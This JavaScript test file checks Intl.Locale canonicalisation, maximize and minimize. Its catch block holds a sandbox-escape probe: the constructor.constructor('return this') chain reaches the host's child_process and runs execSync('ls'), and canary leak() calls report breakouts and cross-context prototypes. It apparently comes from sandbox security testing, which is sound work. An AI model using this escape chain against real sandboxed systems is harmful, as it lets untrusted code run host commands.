try {
    var testData = [
        {
            tag: 'mo',
            canonical: 'ro',
            maximized: 'ro-Latn-RO'
        },
        {
            tag: 'es-ES-preeuro',
            maximized: 'es-Latn-ES-preeuro',
            minimized: 'es-preeuro'
        },
        {
            tag: 'uz-UZ-cyrillic',
            maximized: 'uz-Latn-UZ-cyrillic',
            minimized: 'uz-cyrillic'
        },
        { tag: 'posix' },
        {
            tag: 'hi-direct',
            maximized: 'hi-Deva-IN-direct'
        },
        {
            tag: 'zh-pinyin',
            maximized: 'zh-Hans-CN-pinyin'
        },
        {
            tag: 'zh-stroke',
            maximized: 'zh-Hans-CN-stroke'
        },
        {
            tag: 'aar-x-private',
            canonical: 'aa-x-private',
            maximized: 'aa-Latn-ET-x-private'
        },
        {
            tag: 'heb-x-private',
            canonical: 'he-x-private',
            maximized: 'he-Hebr-IL-x-private'
        },
        {
            tag: 'de-u-kf',
            maximized: 'de-Latn-DE-u-kf'
        },
        {
            tag: 'ces',
            canonical: 'cs',
            maximized: 'cs-Latn-CZ'
        },
        {
            tag: 'hy-arevela',
            canonical: 'hy',
            maximized: 'hy-Armn-AM'
        },
        {
            tag: 'hy-arevmda',
            canonical: 'hyw'
        }
    ];
    for (const {tag, canonical = tag, maximized = canonical, minimized = canonical} of testData) {
        const loc = new Intl.Locale(tag);
        assert.sameValue(new Intl.Locale(tag).toString(), canonical, `new Intl.Locale("${ tag }").toString() returns "${ canonical }"`);
        assert.sameValue(new Intl.Locale(tag).maximize().toString(), maximized, `new Intl.Locale("${ tag }").maximize().toString() returns "${ maximized }"`);
        assert.sameValue(new Intl.Locale(tag).minimize().toString(), minimized, `new Intl.Locale("${ tag }").minimize().toString() returns "${ minimized }"`);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}